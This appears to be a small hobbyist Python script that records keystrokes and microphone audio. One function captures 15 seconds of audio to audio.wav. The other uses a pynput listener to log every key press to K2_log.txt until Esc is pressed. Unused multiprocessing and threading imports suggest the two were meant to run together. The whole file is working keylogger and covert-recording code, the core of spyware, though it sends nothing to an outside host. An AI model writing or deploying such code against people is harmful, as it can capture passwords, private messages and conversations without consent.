from multiprocessing import Process
import threading
import time

# start = time.perf_counter()


#microphone functionality
import sounddevice as sd    #for microphone
from scipy.io.wavfile import write #for microphone
def microphone():
    fs = 44100
    second = 15
    print("recording : ")
    record_voice = sd.rec(int(second*fs), samplerate=fs, channels=2)
    sd.wait()
    write('audio.wav', fs, record_voice)
    print("recording is stoped")




#keys functionality
from pynput.keyboard import Key, Listener

count = 0
keys =[]
def p1():
    def on_press(key):
        global keys,count
        keys.append(key)
        count +=1
        print(key)



        if count >= 1:
            count = 0
            write_file(str(keys))
            keys = []
    with open('K2_log.txt','a') as f:
        f.write("these are pressed keys:\n")

    def write_file(key):
        with open("K2_log.txt",'a') as f:
            for key in keys:
                k= str(key).replace("'","")
                if k.find("enter")>0:
                    f.write("'enter_key'\n")
                elif k.find("backspace")>0:
                    f.write("'backspace_key'\n")
                elif k.find("caps_lock")>0:
                    f.write("'caps_lock'\n")
                elif k.find("space") > 0:
                    f.write("\t")
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press = on_press, on_release=on_release) as listener:
        listener.join()










